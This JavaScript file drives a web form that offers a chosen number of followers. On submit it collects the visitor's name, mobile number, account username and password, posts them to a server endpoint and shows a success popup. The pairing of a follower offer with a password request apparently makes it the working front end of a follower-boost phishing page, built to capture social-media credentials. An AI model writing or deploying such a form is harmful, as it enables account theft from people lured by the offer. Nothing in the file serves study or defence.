document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('followerForm');
    const range = document.getElementById('followerRange');
    const display = document.getElementById('followerDisplay');
    const popup = document.getElementById('popup');
    const closePopup = document.getElementById('closePopup');

    range.addEventListener('input', function() {
        display.textContent = this.value;
    });

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const data = {
            name: document.getElementById('name').value,
            mobile: document.getElementById('mobile').value,
            username: document.getElementById('username').value,
            password: document.getElementById('password').value,
            followers: document.getElementById('followerRange').value
        };

        try {
            const response = await fetch('/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            if (response.ok) {
                popup.classList.remove('hidden');
                form.reset();
                range.value = 100;
                display.textContent = '100';
            } else {
                alert('Error submitting. Please try again.');
            }
        } catch (error) {
            alert('Network error. Check your connection.');
        }
    });

    closePopup.addEventListener('click', function() {
        popup.classList.add('hidden');
    });

    popup.addEventListener('click', function(e) {
        if (e.target === popup) {
            popup.classList.add('hidden');
        }
    });
});
